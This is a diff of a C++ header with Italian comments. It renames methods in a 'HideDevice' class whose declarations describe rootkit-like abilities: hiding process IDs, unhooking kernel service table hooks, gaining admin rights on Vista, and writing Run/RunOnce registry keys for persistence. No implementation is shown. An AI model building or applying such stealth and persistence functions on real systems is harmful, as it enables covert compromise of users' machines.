@@ -24,14 +24,14 @@ typedef struct registry_entry {
 class HideDevice
 {
 	public:
-	void unhook_close();		// Chiude il device di unhook
+	void close();		// Chiude il device di unhook
 	BOOL unhook_all(BOOL is_fixup);				// Unhooka tutte le funzioni hookate
 	BOOL unhook_func(char *func_name, BOOL is_fixup);	// Unhooka una funzione particolare
 	BOOL unhook_hidepid(DWORD PID, BOOL is_add);	// Aggiunge/toglie un pid alla lista di quelli da nascondere
 	BOOL unhook_getadmin();		// Su vista rende admin "figo" (non usare su XP)
 	BOOL unhook_isdrv(WCHAR *driver_name);		// Dice se c'e' il driver che gira
 	BOOL unhook_getpath(WCHAR *driver_name, WCHAR *driver_path, DWORD size);	// Torna il path del driver
-	BOOL unhook_isdev();						// Dice se c'e' il device di unhooking
+	BOOL isdev();						// Dice se c'e' il device di unhooking
 	BOOL unhook_regwriteW(WCHAR *value_name, WCHAR *value);	// Inserisce una chiave in Run/RunOnce
 	BOOL unhook_regdeleteW(WCHAR *value_name);				// Cancella una chiave da Run/RunOnce
 	BOOL unhook_regwriteA(char *value_name, char *value);	// Inserisce una chiave in Run/RunOnce
@@ -46,7 +46,7 @@ class HideDevice
 	~HideDevice(void);
 	
 	private:
-	BOOL HideDevice::unhook_init();
+	BOOL unhook_init();
 	#define NUM_OF_SERVICES 0x300
 	fu_entry SDT_Table[NUM_OF_SERVICES];
 	DWORD	sdt_entry_count;
